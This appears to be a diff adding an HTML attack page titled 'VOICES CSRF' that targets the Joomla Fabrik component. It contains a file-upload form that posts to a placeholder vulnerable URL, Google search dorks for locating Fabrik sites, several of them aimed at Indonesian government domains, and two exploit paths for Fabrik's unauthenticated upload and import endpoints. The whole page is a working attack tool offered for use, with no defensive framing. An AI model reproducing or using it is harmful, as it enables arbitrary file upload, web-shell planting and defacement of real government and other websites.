@@ -1,0 +1,37 @@
+<title>VOICES CSRF</title>
+<br>
+<br>
+
+
+<style>
+ 
+body {
+  background: url(https://i.pinimg.com/originals/bf/2e/a5/bf2ea522294583dbf7c6669316847aeb.gif) no-repeat center center fixed;
+  -webkit-background-size: cover;
+  -moz-background-size: cover;
+  -o-background-size: cover;
+  background-size: cover;
+  color: rgba(255, 255, 255, 0.25);
+  text-align: center;
+  margin: 0;
+  }
+  
+</style>
+
+<font size="10" color ="White">CSRF | Voices | Comfabrik vuln uploader.</h1><br><br>
+
+<form method="POST" action="VULN URL" enctype="multipart/form-data">
+
+<input type="file" name="file"><button>Upload</button>
+
+</form>
+
+</center><br></font>
+
+<font size="4" color = "white">Dork: inurl:index.php/component/fabrik/ site:go.id<br>
+<font size="4" color = "white">Dork: inurl:index.php?option=com_fabrik&view= site:go.id<br>
+<font size="4" color = "white">Dork: inurl:index.php/component/fabrik/ site:go.id<br>
+<font size="4" color = "white">Dork: inurl:index.php?option=com_fabrik<br>
+
+Exploit: /index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload <br>
+Exploit: /index.php?option=com_fabrik&c=import&view=import&filetype=csv&table=1
